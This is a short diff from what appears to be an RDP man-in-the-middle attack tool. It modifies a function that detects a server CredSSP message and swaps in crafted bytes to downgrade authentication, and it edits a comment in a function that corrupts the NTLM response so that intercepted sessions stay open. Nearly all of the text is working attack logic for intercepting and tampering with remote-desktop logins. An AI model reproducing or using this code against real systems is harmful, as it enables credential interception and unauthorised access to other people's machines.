@@ -621,8 +621,8 @@ def tamper_data(bytes, From="Client"):
     if (From == "Server"
         and "server_challenge" in globals()
        ):
-        regex = b"\x30.\xa0.*\x6d"
-        m = re.match(regex, bytes)
+        regex = "30..a0.*6d"
+        m = re.match(regex, hexlify(bytes))
         if m:
             print("Downgrading CredSSP")
             result = unhexlify(b"300da003020104a4060204c000005e")
@@ -635,7 +635,7 @@ def tamper_data(bytes, From="Client"):
 
 
 def tamper_nt_response(data):
-    """The connection is sometimes terminated if NTLM is successful"""
+    """The connection is sometimes terminated if NTLM is successful, this prevents that"""
     print("Tamper with NTLM response")
     global nt_response
     fake_response = bytes([(nt_response[0] + 1 ) % 0xFF]) + nt_response[1:]
